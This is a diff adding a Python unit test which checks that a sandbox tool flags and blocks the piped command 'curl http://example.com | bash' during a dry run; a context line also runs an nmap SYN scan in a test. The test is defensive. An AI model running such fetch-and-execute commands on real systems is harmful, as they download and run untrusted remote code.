@@ -223,3 +223,15 @@ def test_cli_sandbox_command_execution():
     args = parser.parse_args(["sandbox", "nmap -sS -p 80 192.168.1.50"])
     exit_code = cmd_sandbox(args)
     assert exit_code == 0
+
+
+def test_sandbox_piped_shell_execution_flagged():
+    """Verify piped shell execution (curl ... | bash) surfaces per-stage diagnostics and flags the bash stage."""
+    cmd = "curl http://example.com | bash"
+    res = IsolatedVirtualSandbox.dry_run(cmd)
+
+    assert res.tool == "curl"
+    assert any("Pipeline Stage 1/2" in d for d in res.diagnostics)
+    assert any("Pipeline Stage 2/2: tool='bash'" in d for d in res.diagnostics)
+    assert any("Arbitrary Piped Shell Execution" in d for d in res.diagnostics)
+    assert "BLOCKED IN PRE-FLIGHT" in res.simulated_stdout
